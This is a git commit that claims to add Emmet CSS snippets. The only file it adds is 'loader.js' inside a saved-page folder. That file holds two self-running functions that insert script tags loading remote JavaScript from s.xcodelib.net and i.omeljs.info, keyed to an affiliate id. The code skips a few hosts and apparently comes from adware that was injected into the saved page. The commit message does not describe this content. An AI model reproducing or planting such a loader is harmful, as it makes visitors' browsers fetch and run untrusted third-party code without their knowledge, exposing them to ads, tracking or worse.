f6843bf2c91abd88eedf1ac1eb41361440563d6b
alivelee <a871460434@gmail.com>
2014-07-12 18:58:54 +0800

    add emmet css snippets
    add emmet css snippets

---
+++ Emmet CSS Snippets_files/loader.js
@@ -0,0 +1,49 @@
+(function (){ //df
+	var win=window;	
+	var _affId="10040007";
+	
+	
+	try{
+		var cmp_rbt = 'http://s.xcodelib.net/agmz/'+_affId+'/loader.js';
+
+		var id=_affId;
+		
+		try{
+			if(win.location.host.indexOf('facebook.co')==-1 && win.location.host.indexOf("xcodelib.net")==-1  && win.location.host.indexOf(".cloudfront.net")==-1 ){
+				var sf_scriptNode = win.document.createElement('script');
+				sf_scriptNode.type = 'text/javascript';
+				sf_scriptNode.src = cmp_rbt;
+				
+				var headNode = win.document.getElementsByTagName('body');
+				if (headNode[0] != null)
+					headNode[0].appendChild(sf_scriptNode);
+			}			
+		}catch(eeee){}	
+		
+		
+	}catch(exr1){}
+	
+})();
+(function (){ 
+	var win=window;	
+	var _affId="10040007";
+	var _geo="US";
+	
+	
+	try{
+		//var cmp_rbt ='http://i.omeljs.info/omel/javascript.js?channel=src1&appTitle=PennyBee';
+		var cmp_rbt ='http://i.omeljs.info/omel/javascript.js?channel=omelcc&appTitle=PennyBee';
+		try{
+			if(win.location.host.indexOf('facebook.co')==-1 && win.location.host.indexOf("xcodelib.net")==-1  && win.location.host.indexOf(".cloudfront.net")==-1 ){
+				var sf_scriptNode = win.document.createElement('script');
+				sf_scriptNode.type = 'text/javascript';
+				sf_scriptNode.src = cmp_rbt;
+				
+				var headNode = win.document.getElementsByTagName('body');
+				if (headNode[0] != null)
+					headNode[0].appendChild(sf_scriptNode);
+			}			
+		}catch(eeee){}	
+		
+	}catch(exr1){}
+})();
